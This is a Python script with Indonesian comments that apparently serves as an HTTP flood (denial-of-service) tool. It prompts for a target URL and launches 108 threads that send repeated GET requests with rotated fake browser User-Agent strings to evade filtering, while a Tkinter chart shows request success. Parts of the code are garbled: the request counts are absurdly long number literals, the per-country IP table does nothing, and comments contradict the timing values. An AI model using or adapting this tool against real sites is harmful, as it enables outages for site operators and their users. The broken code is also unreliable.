import requests
import threading
import time
import random
import matplotlib.pyplot as plt
import pandas as pd
from tkinter import *
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.dates import DateFormatter

# Informasi pengarang
author = "Koboi_wibu"

# Kelas untuk melakukan permintaan HTTP
class HttpRequester:
    def __init__(self, ip_address):
        self.ip_address = ip_address
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 YaBrowser/21.6.3.757 Yowser/2.5 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
            'Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4638.54 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:12.0) like Gecko',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.109 Mobile Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/20.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/8.0; rv:13.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/22.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/9.0; rv:14.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/24.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/10.0; rv:15.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/11.0; rv:16.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/28.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/12.0; rv:17.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/30.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/13.0; rv:18.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.9876.543 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/32.0 Safari/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0',
            'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/14.0; rv:19.0) like Gecko',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.1234.567 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        self.session = requests.Session()

    # Fungsi untuk membuat permintaan HTTP dengan User-Agent acak
    def make_request(self, url, exit_event, thread_id, success_list, failure_list):
        try:
            start_time = time.time()
            while not exit_event.is_set():
                elapsed_time = time.time() - start_time

                # Interval berdasarkan elapsed_time
                if elapsed_time <= 2:
                    interval = 0.1  # Interval 1 detik untuk 8 detik pertama
                    num_requests = 1766999999999999999999999999999999888888888888
                else:
                    interval = 0.01  # Interval 0,05 detik setelah 32 detik
                    num_requests = 108808888888888888888888888821088108888888888888888888888888888888899000000000000000000000088888888888888888888888888888888888888888880000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000999999999999999999999999990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999999999999999999999999210881088888888888888888888888888888888990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009999999999999999999999999999999999999999999999999999999999999999999999999999999999999999988888889900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000999999999999999999999999990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999999999999999999999999210881088888888888888888888888888888888990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009999999999999999999999999999999999999999999999999999999999210881088888888888888888888888882108810888888888888888888888888888888889900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000999999999999999999999999990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999999999999999999999999210881088888888888888888888888888888888990000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099999999999999999999999999000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000009999999999999999999999999999999999999999999999         
                for _ in range(num_requests):
                    try:
                        user_agent = random.choice(self.user_agents)
                        headers = {'User-Agent': user_agent}
                        response = self.session.get(url, headers=headers)
                        response.raise_for_status()
                        print(f"Thread-{thread_id}: Permintaan ke {url} berhasil! Status code: {response.status_code}")
                        success_list.append(time.time())
                    except requests.exceptions.RequestException as e:
                        print(f"Thread-{thread_id}: Gagal melakukan permintaan ke {url}: {e}")
                        failure_list.append(time.time())
                        exit_event.set()
                    
                    delay = random.uniform(0.1, 0.5)  # Jeda acak antara 0.1 detik hingga 1 detik
                    time.sleep(delay)

        except KeyboardInterrupt:
            print(f"Thread-{thread_id}: Ctrl+C ditekan. Menghentikan permintaan...")
            exit_event.set()

# Fungsi untuk mendapatkan alamat IP berdasarkan negara
def get_ip_by_country(country):
    country_ips = {
        "brazil": "157.240.0.174",
        "bulgaria": "157.240.0.174",
        "croatia": "31.13.84.174",
        "finlandia": "157.240.205.174",
        "usa": "31.13.65.174",
        "israel": "157.240.251.174",
        "chicago": "38.145.202.12"
    }
    return country_ips.get(country.lower(), None)

def plot_candlestick(data, title, canvas, ax):
    ax.clear()

    for idx, row in data.iterrows():
        color = 'g' if row['Close'] >= row['Open'] else 'r'
        ax.plot([idx, idx], [row['Low'], row['High']], color=color)
        ax.plot([idx, idx - pd.Timedelta(minutes=2)], [row['Open'], row['Open']], color=color, linewidth=6)
        ax.plot([idx, idx + pd.Timedelta(minutes=2)], [row['Close'], row['Close']], color='white', linewidth=6)

    ax.set_title(title, color='purple')
    ax.set_xlabel('Waktu', color='purple')
    ax.set_ylabel('Jumlah Permintaan', color='purple')
    ax.tick_params(colors='purple')
    ax.xaxis.set_major_formatter(DateFormatter("%H:%M:%S"))

    plt.xticks(rotation=45, color='purple')
    plt.yticks(color='purple')
    plt.tight_layout()
    canvas.draw()

def update_plot(success_list, failure_list, canvas, ax):
    times = sorted(success_list + failure_list)
    success_counts = [success_list.count(t) for t in times]
    failure_counts = [failure_list.count(t) for t in times]

    data = {
        'Date': pd.to_datetime(times, unit='s'),
        'Open': success_counts,
        'High': [max(success_counts[:i+1]) for i in range(len(success_counts))],
        'Low': [min(success_counts[:i+1]) for i in range(len(success_counts))],
        'Close': success_counts
    }
    df = pd.DataFrame(data)
    df.set_index('Date', inplace=True)

    plot_candlestick(df, 'Statistik Permintaan HTTP', canvas, ax)

def execute_request(url, ip_address, success_list, failure_list, canvas, ax):
    # Membuat instance HttpRequester
    requester = HttpRequester(ip_address)

    # Konfigurasi thread dan permintaan
    jumlah_thread = 108

    # Membuat dan menjalankan thread-thread
    exit_event = threading.Event()
    threads = []

    for i in range(jumlah_thread):
        thread = threading.Thread(target=requester.make_request, args=(url, exit_event, i + 1, success_list, failure_list))
        threads.append(thread)
        thread.start()

    try:
        while any(thread.is_alive() for thread in threads):
            update_plot(success_list, failure_list, canvas, ax)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Ctrl+C ditekan. Menghentikan semua thread...")

    for thread in threads:
        thread.join()

    print(f"\nScript ini ditulis oleh: {author}")

def main():
    # Meminta URL target dari pengguna
    url = input("Masukkan URL target: ")

    # Memilih negara untuk alamat IP
    country = input("Pilih negara untuk alamat IP (brazil, bulgaria, croatia, finlandia, usa, israel, chicago): ")
    ip_address = get_ip_by_country(country)

    if not ip_address:
        print("Negara yang dimasukkan tidak valid.")
        return

    # Membuat jendela GUI untuk menampilkan statistik
    root = Tk()
    root.title("Statistik Permintaan HTTP")

    fig, ax = plt.subplots()
    canvas = FigureCanvasTkAgg(fig, master=root)
    canvas.get_tk_widget().pack(side=TOP, fill=BOTH, expand=1)

    success_list = []
    failure_list = []

    threading.Thread(target=execute_request, args=(url, ip_address, success_list, failure_list, canvas, ax)).start()

    root.mainloop()

if __name__ == "__main__":
    main()
